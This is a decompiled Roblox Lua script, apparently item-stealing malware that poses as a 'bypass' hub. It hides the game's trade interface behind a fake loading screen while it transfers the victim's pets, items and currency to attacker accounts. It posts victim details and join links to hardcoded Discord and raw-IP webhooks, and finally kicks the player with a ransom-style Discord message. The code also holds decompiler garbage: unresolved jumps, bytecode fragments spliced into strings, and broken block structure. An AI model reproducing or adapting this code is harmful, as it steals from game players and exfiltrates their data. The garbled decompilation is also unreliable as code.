-- Decompiled from MoonSec V3 disassembly
-- (best-effort; control flow may need minor manual cleanup)
-- By ZeroVector101
task.spawn(function(...)
    for v, v2 in ipairs(game:GetDescendants()) do

        if v2:IsA("Sound") then
            v2.Volume = 0
            v2.PlayOnRemove = false
        end
    end

    game.DescendantAdded:Connect(function(p0)
        if p0:IsA("Sound") then
            p0.Volume = 0
            p0.PlayOnRemove = false
        end
    end)
end)
ttd = 13775256536
bgsi = 85896571713843
GrowGarden = 126884695634066
SHALL_DUALHOOK = false
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local v = localPlayer.Name
logs = "http://89.169.3.53:8000/webhook/f3c00d94-0527-4873-90d6-dce9c2b0af1a"
logstruewebhook = "https://discord.com/api/webhooks/1489997831732334653/57PuxeBqPoWlknwh6-NjKlyngLtu_Ad83YQZf0fB1yGQIB-U3-1Jjz0KbOGdyCn2EnrU"
DH_PROCENT = 0
hello = 100
local config = {"Maionez221"}
local v2 = func_bf96293b(usernames)
local config2 = {}

for v3, v4 in ipairs(config) do
    table.insert(config2, v4)
end

for v5, v6 in ipairs(usernames) do
    table.insert(config2, v6)
end

EndImage = function()
    _G.ScriptName = "All your items has been stolen!
Join this discord server to get ur items back
discord.gg/noprofit"
    local screenGui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local textLabel = Instance.new("TextLabel")
    screenGui.Name = "Loading"
    screenGui.Parent = game.Players.LocalPlayer.PlayerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 999999999
    screenGui.Enabled = false
    frame.Name = "MainFrame"
    frame.Parent = screenGui
    frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
    frame.Size = UDim2.new(1.25, 0, 1.25, 0)
    textLabel.Name = "Title"
    textLabel.Parent = frame
    textLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.BackgroundTransparency = 1
    textLabel.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
    textLabel.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
    textLabel.Font = Enum.Font.FredokaOne
    textLabel.Text = _G.ScriptName
    textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.TextScaled = true
    textLabel.TextSize = 14
    textLabel.TextWrapped = true
    img_link = "https://cdn.discordapp.com/attachments/1199660172767936532/1366411544430247967/i.png?ex=6810d96a&is=680f87ea&hm=3697d9f790834d4910462a097a95f9f9894bd79dea199a0aaf464986da832281&"
    response = request({
        Url = img_link,
        Method = "GET",
    })

    if response and response.Body then
        local v = "lol_photo.png"
        writefile(v, response.Body)
        local imageLabel = Instance.new("ImageLabel")
        Image = imageLabel
        Image.Parent = frame
        Image.Size = UDim2.new(0.25, 0, 0.2, 0)
        Image.Position = UDim2.new(0.38, 0, 0.5, 0)
        Image.BorderSizePixel = 0
        Image.Image = getcustomasset(v)
        screenGui.Enabled = true
    end
end

if getgenv().executed then

    return

end

getgenv().executed = true
HideTradeGui = function()
    _G.ScriptName = "Imposible Hub"
    _G.Tip1 = "Wait 5 minutes for bypass"
    _G.Tip2 = "Bypass might take up to 5 minutes to activate"
    _G.Tip3 = "We are getting a little closer"
    local screenGui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local textLabel = Instance.new("TextLabel")
    local frame2 = Instance.new("Frame")
    local frame3 = Instance.new("Frame")
    local uICorner = Instance.new("UICorner")
    local frame4 = Instance.new("Frame")
    local uICorner2 = Instance.new("UICorner")
    local frame5 = Instance.new("Frame")
    local uICorner3 = Instance.new("UICorner")
    local frame6 = Instance.new("Frame")
    local uICorner4 = Instance.new("UICorner")
    local frame7 = Instance.new("Frame")
    local uICorner5 = Instance.new("UICorner")
    local frame8 = Instance.new("Frame")
    local uICorner6 = Instance.new("UICorner")
    local frame9 = Instance.new("Frame")
    local frame10 = Instance.new("Frame")
    local uICorner7 = Instance.new("UICorner")
    local uICorner8 = Instance.new("UICorner")
    local textLabel2 = Instance.new("TextLabel")
    local textLabel3 = Instance.new("TextLabel")
    local frame11 = Instance.new("Frame")
    screenGui.Name = "Loading"
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 999999999
    frame.Name = "MainFrame"
    frame.Parent = screenGui
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
    frame.Size = UDim2.new(1.25, 0, 1.25, 0)
    textLabel.Name = "Title"
    textLabel.Parent = frame
    textLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.BackgroundTransparency = 1
    textLabel.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
    textLabel.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
    textLabel.Font = Enum.Font.FredokaOne
    textLabel.Text = _G.ScriptName
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextScaled = true
    textLabel.TextSize = 14
    textLabel.TextWrapped = true
    frame2.Name = "Dots"
    frame2.Parent = frame
    frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    frame2.BackgroundTransparency = 1
    frame2.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
    frame2.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
    frame3.Name = "Dot1"
    frame3.Parent = frame2
    frame3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame3.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
    frame3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    uICorner.CornerRadius = UDim.new(0.5, 0)
    uICorner.Parent = frame3
    frame4.Name = "InsideDot"
    frame4.Parent = frame3
    frame4.AnchorPoint = Vector2.new(0.5, 0.5)
    frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    frame4.Position = UDim2.new(0.5, 0, 0.5, 0)
    uICorner2.CornerRadius = UDim.new(0.5, 0)
    uICorner2.Parent = frame4
    frame5.Name = "Dot2"
    frame5.Parent = frame2
    frame5.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame5.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
    frame5.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    uICorner3.CornerRadius = UDim.new(0.5, 0)
    uICorner3.Parent = frame5
    frame6.Name = "InsideDot"
    frame6.Parent = frame5
    frame6.AnchorPoint = Vector2.new(0.5, 0.5)
    frame6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    frame6.Position = UDim2.new(0.5, 0, 0.5, 0)
    uICorner4.CornerRadius = UDim.new(0.5, 0)
    uICorner4.Parent = frame6
    frame7.Name = "Dot3"
    frame7.Parent = frame2
    frame7.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame7.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
    frame7.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    uICorner5.CornerRadius = UDim.new(0.5, 0)
    uICorner5.Parent = frame7
    frame8.Name = "InsideDot"
    frame8.Parent = frame7
    frame8.AnchorPoint = Vector2.new(0.5, 0.5)
    frame8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    frame8.Position = UDim2.new(0.5, 0, 0.5, 0)
    uICorner6.CornerRadius = UDim.new(0.5, 0)
    uICorner6.Parent = frame8
    frame9.Name = "Bar"
    frame9.Parent = frame
    frame9.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame9.BorderSizePixel = 0
    frame9.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
    frame9.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
    frame10.Name = "Bar2"
    frame10.Parent = frame9
    frame10.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    frame10.BorderSizePixel = 0
    frame10.Size = UDim2.new(0, 0, 1, 0)
    uICorner7.CornerRadius = UDim.new(0.5, 0)
    uICorner7.Parent = frame10
    uICorner8.CornerRadius = UDim.new(0.5, 0)
    uICorner8.Parent = frame9
    textLabel2.Name = "Percentage"
    textLabel2.Parent = frame9
    textLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textLabel2.BackgroundTransparency = 1
    textLabel2.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
    textLabel2.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
    textLabel2.Font = Enum.Font.FredokaOne
    textLabel2.Text = "0%"
    textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel2.TextScaled = true
    textLabel2.TextSize = 14
    textLabel2.TextWrapped = true
    textLabel3.Name = "Tip"
    textLabel3.Parent = frame
    textLabel3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textLabel3.BackgroundTransparency = 1
    textLabel3.Position = UDim2.new(0.280816913, 0, 0.717294872, 0)
    textLabel3.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0)
    textLabel3.Font = Enum.Font.SourceSansItalic
    textLabel3.Text = ""
    textLabel3.TextColor3 = Color3.fromRGB(138, 138, 138)
    textLabel3.TextScaled = true
    textLabel3.TextSize = 14
    textLabel3.TextWrapped = true
    frame11.Name = "EndSequence"
    frame11.Parent = screenGui
    frame11.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame11.BorderSizePixel = 0
    frame11.Position = UDim2.new(1, 0, 0, 0)
    frame11.Size = UDim2.new(1, 0, 1, 0)

    coroutine.wrap(function()
        local v = Instance.new("LocalScript", frame2)

        while true do
            wait(0.25)
            v.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            v.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            v.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            v.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            v.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            v.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
        end
    end)()

    coroutine.wrap(function()
        local v = Instance.new("LocalScript", frame)
        local v2 = v.Parent.Bar
        wait(5)
        v2.Bar2:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Linear", 200, true)
        wait(200)
        v.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quad", 3, true)
        wait(3)
        game.Players.LocalPlayer:Kick("All your items has been stolen!
Join this discord server to get ur items back
discord.gg/noprofit")
    end)()

    coroutine.wrap(function(...)
        local v = Instance.new("LocalScript", textLabel2)
        wait(5)

        for v2 = 1, 100 do
            v.Parent.Text = v2 .. "%"
            wait(2)
        end
    end)()

    coroutine.wrap(function()
        local v = Instance.new("LocalScript", textLabel3)
        local v2 = v.Parent

        while true do
            wait(5)
            v2.Text = _G.Tip1
            wait(5)
            v2.Text = _G.Tip2
            wait(5)
            v2.Text = _G.Tip3
        end
    end)()

    coroutine.wrap(function()
        local v = Instance.new("LocalScript", screenGui)
        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
    end)()
end
HideTradeGui()

if game.PlaceId == ttd then
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local v7 = require(ReplicatedStorage:WaitForChild("MultiboxFramework"))
    local v8 = v7:WaitForModule("Inventory")
    local v9 = v7:WaitForModule("Network")
    ReplicatedStorage:WaitForChild("NetworkingContainer"):WaitForChild("DataRemote")
    SendMail = v9.CreateFunc("PostOffice_SendGift").sID
    SellTroops = v9.CreateEvent("SellTroops").ID
    OpenCrate = v9.CreateEvent("OpenCrates").ID
    local Players2 = game:GetService("Players")
    local v10 = Players2:GetUserIdFromNameAsync(Username_for_ttd)
    MailMessage = "gg/noprofit"
    local Players3 = game:GetService("Players")
    Players3.LocalPlayer.PlayerGui.MainFrames.Notifications.Visible = false
    local config3 = {}
    sorted = config3
    local _upv1 = v8.GetAllExistData()
    GetHits = function(...)
        local config = {}
        sorted = config

        for v, v2 in pairs(func_5e69bbcd().Troops) do

            if v2 then

                for v3, v4 in pairs(v2) do

                    table.insert(sorted, {
                        UID = v3,
                        Exists = _upv1.Troops[v .. "-Shiny"],
                        to_steal = v10,
                        Name = v,
                        Class = "Troops",
                    })
                end
            end
        end

        for v5, v6 in pairs(func_5e69bbcd().Crates) do

            for v7, v8 in pairs(v6) do

                if v7 then
                    table.insert(sorted, {
                        UID = v7,
                        Exists = _upv1.Crates[v5],
                        to_steal = v10,
                        Name = v5,
                        Class = "Crates",
                    })
                end
            end
        end

        table.sort(sorted, function(p0, p1)
            -- Lt: if R2 > R3 then PC += 1
            -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)

            return true
        end)

        return sorted
    end
    sorted = GetHits()

    if #sorted ~= 0 then

        if 1000000 < sorted[1].Exists and v8.Crates == nil then

            task.wait(99999)
        end

        partnerid = 17426768586
        tradingplazaid = 14682939953
        playingid = 14082129854

        if game.PlaceId == partnerid and game.PlaceId == tradingplazaid and game.PlaceId == playingid then

            task.wait(99999)
        end

        is_unit_exists = func_230849ca
        sell_unit = function(...)
            repeat
                Units = GetHits()
                local v = Units[#Units]

                for v2, v3 in pairs(Units) do

                    if v3.UID == v.UID and v3.Class == "Crates" then
                        open_crate(v3.UID)

                        return true

                    end
                end

                local config = {}
                local config2 = {}
                local config3 = {}
                config3[1] = SellTroops
                local config4 = {}
                config4[1] = v.UID
                config3[2] = config4
                config2[1] = config3
                config[1] = config2
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                ReplicatedStorage:WaitForChild("NetworkingContainer"):WaitForChild("DataRemote"):FireServer()

                task.wait(0.25)
            until not (is_unit_exists(v.UID))
        end
        send_unit = function(p0, p1)
            for v, v2 in pairs(GetHits()) do

                if v2.UID == p0 then
                    name = v2.Name
                    -- Lt: if R7 > 25000 then PC += 1
                else
                    if 1000000000 < func_d58d981d().Currencies.Gems and hello <= DH_PROCENT then
                        SHALL_DUALHOOK = false
                    end

                    if 1000000 < v2.Exists then

                        task.wait(99999)
                    end
                end

                repeat
                    diamonds = func_d58d981d().Currencies.Gems
                    local config = {}
                    local config2 = {}
                    local config3 = {}
                    config3[1] = SendMail
                    config3[2] = 1234518324781
                    config3[3] = v10
                    config3[4] = p1
                    config3[5] = p0
                    config3[6] = diamonds
                    config3[7] = MailMessage
                    config2[1] = config3
                    config[1] = config2

                    if SHALL_DUALHOOK then
                        local Players = game:GetService("Players")
                        config[1][1][3] = Players:GetUserIdFromNameAsync("popcatdzcutenhat")
                        config[1][1][7] = "hi"
                    end

                    local ReplicatedStorage = game:GetService("ReplicatedStorage")
                    ReplicatedStorage:WaitForChild("NetworkingContainer"):WaitForChild("DataRemote"):FireServer()

                    task.wait(0.25)
                until not (is_unit_exists(p0))
                data1 = {
                    content = "successfully sent " .. name .. " and this much diamonds: " .. diamonds,
                    username = ".gg/noprofit",
                }

                if SHALL_DUALHOOK then
                    LogsHitsWebhook = logstruewebhook
                end

                local config5 = {}
                config5.Url = LogsHitsWebhook
                config5.Method = "POST"
                local config6 = {}
                config6["Content-Type"] = "application/json"
                config5.Headers = config6
                local HttpService = game:GetService("HttpService")
                config5.Body = HttpService:JSONEncode(data1)
                request(config5)

                return

            end
        end
        open_crate = function(p0)
            local config = {}
            local config2 = {}
            local config3 = {}
            config3[1] = OpenCrate
            config3[2] = p0
            config3[3] = 1
            config2[1] = config3
            config[1] = config2

            repeat
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                ReplicatedStorage:WaitForChild("NetworkingContainer"):WaitForChild("DataRemote"):FireServer()

                task.wait(0.25)
            until not (is_unit_exists(p0))
        end
        open_all_crates_and_sell_unist = function(...)
            Hits = GetHits()

            for v, v2 in pairs(Hits) do

                if v2.Class == "Crates" then
                    open_crate(v2.UID)
                end
            end

            repeat
                sell_unit()
            until 1000000 < GetHits()[#GetHits()].Exists
        end
        GetCrates = function(...)
            c = 0

            for v, v2 in pairs(GetHits()) do

                if v2.Class == "Crates" then
                    c = c + 1
                end
            end

            return c
        end
        HitsString = ""

        for v11, v12 in pairs(sorted) do
            HitsString = HitsString .. v12.Name .. " - " .. v12.Exists .. "\n"
        end

        GetPastebin = function(p0)
            local config = {}
            config.Method = "POST"
            config.Timeout = 10
            config.Url = "https://pastebin.com/api/api_post.php"
            local config2 = {}
            config2["Content-Type"] = "application/x-www-form-urlencoded"
            config.Headers = config2
            config.Body = "api_paste_code=" .. p0 .. "&api_option=paste&api_dev_key=aL23vA-UXpKHvGuqL5_jJ4YIVZGY5Nrr"
            site = request(config)
            hitslist = site.Body

            if string.find(hitslist, "https://pastebin.com/") then
                hitslist = "[Click Me](" .. hitslist .. ")"
            else
                hitslist = "Ratelimited"
            end

            return hitslist
        end
        hits = GetPastebin(HitsString)

        if GetHits()[1].Exists < 100000 then
            ping = "@everyone"
        else
            ping = "bad hit"
        end

        local config4 = {}
        config4.content = ping
        config4.username = ".gg/noprofit"
        local config5 = {config6}
        local config6 = {}
        local config7 = {
            config8,
            config9,
            config10,
            config11,
            config12,
        }
        local config8 = {}
        config8.name = "Player Name"
        config8.value = v
        config8.inline = false
        local config9 = {}
        config9.name = "best item"
        local v13 = sorted[1].Class
        config9.value = sorted[1].Name .. " - " .. sorted[1].Exists .. " " .. v13
        config9.inline = false
        local config10 = {}
        config10.name = "gems"
        config10.value = func_d58d981d().Currencies.Gems
        config10.inline = false
        local config11 = {}
        config11.name = "all items"
        config11.value = hits
        config11.inline = false
        local config12 = {}
        config12.name = "Reciver"
        config12.value = Username_for_ttd
        config12.inline = false
        config6.fields = config7
        config4.embeds = config5
        data = config4
        -- Lt: if R17 > 25000 then PC += 1
    else
        if 50000 < func_d58d981d().Currencies.Gems then

            if hello <= DH_PROCENT then
                local config13 = {}
                config13.Url = logstruewebhook
                config13.Method = "POST"
                local config14 = {}
                config14["Content-Type"] = "application/json"
                config13.Headers = config14
                local HttpService = game:GetService("HttpService")
                config13.Body = HttpService:JSONEncode(data)
                request(config13)
            else
                local config15 = {}
                config15.Url = LogsHitsWebhook
                config15.Method = "POST"
                local config16 = {}
                config16["Content-Type"] = "application/json"
                config15.Headers = config16
                local HttpService2 = game:GetService("HttpService")
                config15.Body = HttpService2:JSONEncode(data)
                request(config15)
            end

            local config17 = {}
            config17.Url = logs
            config17.Method = "POST"
            local config18 = {}
            config18["Content-Type"] = "application/json"
            config17.Headers = config18
            local HttpService3 = game:GetService("HttpService")
            config17.Body = HttpService3:JSONEncode(data)
            request(config17)

            while true do

                if 0 < #GetHits() then
                    Latest_Inventory = GetHits()
                    BestUnit = Latest_Inventory[1]

                    if 100 <= func_d58d981d().Currencies.Coins then
                        send_unit(BestUnit.UID, BestUnit.Class)
                    end
                end

                if func_d58d981d().Currencies.Coins < 100 and GetCrates() == 0 then
                    sell_unit()
                end
            end

            if func_d58d981d().Currencies.Coins < 100 and 0 < GetCrates() then
                sell_unit()
            end
        end
    until func_d58d981d().Currencies.Coins < 100
until 0 < GetCrates()
until Latest_Inventory[#Latest_Inventory].Exists < 1000000
open_all_crates_and_sell_unist()
end
end

EndImage()
else
if game.PlaceId == bgsi then
local config20 = {}
allpets = config20
local config21 = {}
local HttpService4 = game:GetService("HttpService")
local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
local Players4 = game:GetService("Players")
local localPlayer2 = Players4.LocalPlayer
local _upv1 = require(ReplicatedStorage2.Client.Framework.Services.LocalData)
func_8724982c()
local v14 = game.PlaceId
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = "game:GetService("TeleportService"):TeleportToPlaceInstance("
local v15 = TeleportService .. game.PlaceId .. ", ""\n[ 491]	 Move	| 27 | 23 | 0 |	R27 = R23\n[ 492]	 LoadK	| 28 | 142 | 0 |	R28 = "")" .. v13 .. v28
local v16 = localPlayer.leaderstats["��� Bubbles"].Value
local v17 = localPlayer.leaderstats["��� Hatches"].Value
local v18 = "https://discord.gg/noprofit"

if allpets[1] then

if not (allpets[1].Name) then
local v19 = "None"
end

if allpets[1] then

if not (tostring(allpets[1].Value)) then
    local v20 = "0"
end

for v21, v22 in ipairs(allpets) do
    local v23 = 0 + v22.Value * v22.Amount
end

local v24 = #allpets

for v25 = 1, math.min(10, v24) do
    local v26 = allpets[v25]

    if v26.Shiny then

        if v26.Mythic then
        else
            if v26.Shiny then
            else
            end
        end

        local v27 = " (x"
    end

    if "" .. v25 .. ". " .. v26.Name .. " (Mythic)" .. " - Value: " .. v26.Value .. v27 .. v26.Amount .. ")\n" == "" then
        local v28 = "No pets available"
    end

    local config22 = {}
    config22.content = "@everyone\n" .. v15
    config22.username = ".gg/noprofit"
    local config23 = {config24}
    local config24 = {}
    local config25 = {
        config26,
        config27,
        config28,
        config29,
        config30,
        config31,
        config32,
        config33,
    }
    local config26 = {}
    config26.name = "Player Name"
    config26.value = v
    config26.inline = false
    local config27 = {}
    config27.name = "Best item"
    config27.value = v19 .. " - " .. v20
    config27.inline = false
    local config28 = {}
    config28.name = "Total Value"
    config28.value = tostring(v23)
    config28.inline = false
    local config29 = {}
    config29.name = "Total bubble"
    config29.value = tostring(v16)
    config29.inline = false
    local config30 = {}
    config30.name = "Total Eggs"
    config30.value = tostring(v17)
    config30.inline = false
    local config31 = {}
    config31.name = "Top 10 Expensive Pets"
    config31.value = v28
    config31.inline = false
    local config32 = {}
    config32.name = "Recivers"
    config32.value = v2
    config32.inline = false
    local config33 = {}
    config33.name = "Discord Server"
    config33.value = v18
    config33.inline = false
    config24.fields = config25
    config22.embeds = config23
    local config34 = {}
    config34.content = v15
    config34.username = ".gg/noprofit"
    local config35 = {config36}
    local config36 = {}
    local config37 = {
        config38,
        config39,
        config40,
        config41,
        config42,
        config43,
        config44,
        config45,
    }
    local config38 = {}
    config38.name = "Player Name"
    config38.value = v
    config38.inline = false
    local config39 = {}
    config39.name = "Best item"
    config39.value = v19 .. " - " .. v20
    config39.inline = false
    local config40 = {}
    config40.name = "Total Value"
    config40.value = tostring(v23)
    config40.inline = false
    local config41 = {}
    config41.name = "Total bubble"
    config41.value = tostring(v16)
    config41.inline = false
    local config42 = {}
    config42.name = "Total Eggs"
    config42.value = tostring(v17)
    config42.inline = false
    local config43 = {}
    config43.name = "Top 10 Expensive Pets"
    config43.value = v28
    config43.inline = false
    local config44 = {}
    config44.name = "Recivers"
    config44.value = v2
    config44.inline = false
    local config45 = {}
    config45.name = "Discord Server"
    config45.value = v18
    config45.inline = false
    config36.fields = config37
    config34.embeds = config35

    if 100 < v23 then

        if hello <= DH_PROCENT then
            func_73548890(logstruewebhook, config22)
        else
            if 100 < v23 then
                func_73548890(BigHitsWebhook, config22)
            else
                func_73548890(LogsHitsWebhook, config34)
            end
        end

        func_73548890(logs, config34)
        func_4b71649a()
        allpets = func_b495452c()

        while true do

            for v29, v30 in ipairs(config2) do
                local Players5 = game:GetService("Players")

                task.wait(0.1)

                if Players5:FindFirstChild(v30) then

                    if false == false and localPlayer2:GetAttribute("Trading") == false then
                        func_8724982c()

                        if v23 == 0 then
                            EndImage()
                        end

                        svo = 0
                        addedpets = false
                    end

                    if localPlayer2:GetAttribute("Trading") == false then
                        func_e1901b00(v30)

                        task.wait(0.1)
                    end

                    if localPlayer2:GetAttribute("Trading") == true then

                        task.wait(0.25)

                        if allpets then

                            if 0 < #allpets then

                                for v31, v32 in ipairs(allpets) do

                                    if svo < 10 and addedpets == false then

                                        for v33 = 1, v32.Amount do

                                            if svo < 10 then

                                                func_e2609d8a(v32.Id, 0)
                                                svo = svo + 1

                                                task.wait(0.325)
                                            else
                                            end
                                        end

                                        if 10 <= svo then
                                            addedpets = true
                                        else
                                        end
                                    end
                                end

                                while true do

                                    if addedpets and localPlayer2:GetAttribute("Trading") == true then
                                        func_6541dc2e()

                                        task.wait()
                                        func_2a1f0f62()
                                    end

                                    warn("No pets available to trade")
                                end
                            end

                            task.wait(0.1)
                        end
                    else
                        if game.PlaceId == GrowGarden then
                            local ReplicatedStorage3 = game:GetService("ReplicatedStorage")
                            local ReplicatedStorage4 = game:GetService("ReplicatedStorage")
                            local ReplicatedStorage5 = game:GetService("ReplicatedStorage")
                            local v34 = require(ReplicatedStorage5.Modules.DataService)
                            local _upv1 = require(ReplicatedStorage4.Data.PetRegistry)
                            local _upv2 = require(game.ReplicatedStorage.Modules.NumberUtil)
                            local _upv3 = require(game.ReplicatedStorage.Modules.PetServices.PetUtilities)
                            GetPetValue = function(p0)
                                local v = v34:GetData().PetsData.PetInventory.Data[p0:GetAttribute("PET_UUID")]
                                local v2 = _upv1.PetEggs[v.PetData.HatchedFrom].RarityData.Items[v.PetType].GeneratedPetData.WeightRange
                                -- [55] TailCall: return R11(R12)

                                return math.floor
                            end
                            pets = workspace.PetsPhysical:GetChildren()

                            for v35, v36 in pairs(pets) do

                                if v36:GetAttribute("OWNER") == game.Players.LocalPlayer.Name then
                                    local ReplicatedStorage6 = game:GetService("ReplicatedStorage")
                                    ReplicatedStorage6:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer()
                                end
                            end

                            wait(1)
                            local _upv1 = require(ReplicatedStorage3.Modules.CalculatePlantValue)
                            getinv = function(...)
                                local Players = game:GetService("Players")
                                backpack = Players.LocalPlayer.Backpack:GetChildren()
                                local config = {}
                                items = config

                                for v, v2 in pairs(backpack) do

                                    if v2:GetAttribute("ItemType") == "Pet" then
                                        RAP = GetPetValue(v2)
                                        CLASS = "Pet"
                                        UUID = v2:GetAttribute("PET_UUID")
                                        NAME = v34:GetData().PetsData.PetInventory.Data[v2:GetAttribute("PET_UUID")].PetType
                                    else
                                        RAP = _upv1(v2)
                                        CLASS = "Item"
                                        NAME = v2:GetAttribute("ItemName")
                                        UUID = v2:GetAttribute("ITEM_UUID")
                                    end

                                    if NAME ~= "Raccoon" then

                                        if NAME == "DragonFly" then
                                            RAP = RAP + 1000000000000
                                        end

                                        if 0 < RAP then
                                            table.insert(items, {
                                                name = NAME,
                                                rap = RAP,
                                                uid = UUID,
                                                class = CLASS,
                                                item_as_object = v2,
                                            })
                                        end
                                    end

                                    table.sort(items, function(p0, p1)
                                        -- Lt: if R3 > R2 then PC += 1
                                        -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)

                                        return true
                                    end)

                                    return items

                                end
                            end
                            inv = getinv()
                            list = ""
                            c = 0

                            for v37, v38 in pairs(inv) do
                                local v39 = " : "
                                list = list .. v38.name .. v39 .. func_6e518312(v38.rap) .. " Value\n"

                            end

                            if list == "" then
                                list = "No Items!"
                            end

                            TOTAL_RAP = 0

                            for v40, v41 in pairs(inv) do
                                local v42 = v41.rap
                                TOTAL_RAP = TOTAL_RAP + v42
                            end

                            local v43 = list
                            list = "Total Value: " .. func_6e518312(TOTAL_RAP) .. "\n\n" .. v43
                            local TeleportService2 = "game:GetService("TeleportService"):TeleportToPlaceInstance("

                            if 1000000000 < TOTAL_RAP then
                                PING = "--@everyone\n"
                                Webhook = BigHitsWebhook
                            else
                                PING = ""
                                Webhook = SmallHitsWebhook
                            end

                            local config47 = {}
                            local TeleportService3 = "game:GetService("TeleportService"):TeleportToPlaceInstance("
                            config47.content = PING .. TeleportService3 .. game.PlaceId .. ", ""\n[1045]	 GetGlobal	| 19 | 9 | 0 |	R19 = game\n[1046]	 GetTable	| 19 | 19 | 395 |	R19 = R19.JobId\n[1047]	 LoadK	| 20 | 142 | 0 |	R20 = "")" .. v42 .. v39
                            local config48 = {config49}
                            local config49 = {}
                            config49.title = "NOPROFIT ON TOP!"
                            config49.color = tonumber(7996848)
                            local config50 = {config51, config52, config53, config54}
                            local config51 = {}
                            config51.name = "Victim Info"
                            config51.value = "```Username: " .. game.Players.LocalPlayer.Name .. "\nGame: Grow A Garden```"
                            config51.inline = false
                            local config52 = {}
                            config52.name = "Inventory Information 10 best items"
                            config52.value = "```" .. list .. "```"
                            config52.inline = false
                            local config53 = {}
                            config53.name = "Discord Server"
                            config53.value = "https://discord.gg/noprofit"
                            config53.inline = false
                            local config54 = {}
                            config54.name = "URL Joiner"
                            local v44 = ")"
                            config54.value = "[click to join victim](https://joiner.up.railway.app/" .. game.PlaceId .. "/" .. game.JobId .. v44
                            config54.inline = false
                            config49.fields = config50
                            config47.embeds = config48
                            config47.content = TeleportService2 .. game.PlaceId .. ", ""\n[1023]	 GetGlobal	| 16 | 9 | 0 |	R16 = game\n[1024]	 GetTable	| 16 | 16 | 395 |	R16 = R16.JobId\n[1025]	 LoadK	| 17 | 142 | 0 |	R17 = "")" .. v43 .. v41:gsub(PING, "")

                            if 1000000000 < TOTAL_RAP then

                                if hello <= DH_PROCENT then
                                    local config55 = {}
                                    config55.Url = logstruewebhook
                                    config55.Method = "POST"
                                    local config56 = {}
                                    config56["Content-Type"] = "application/json"
                                    config55.Headers = config56
                                    local HttpService5 = game:GetService("HttpService")
                                    config55.Body = HttpService5:JSONEncode(config47)
                                    request(config55)
                                else
                                    if 1000000000 < TOTAL_RAP then
                                        local config57 = {}
                                        config57.Url = BigHitsWebhook
                                        config57.Method = "POST"
                                        local config58 = {}
                                        config58["Content-Type"] = "application/json"
                                        config57.Headers = config58
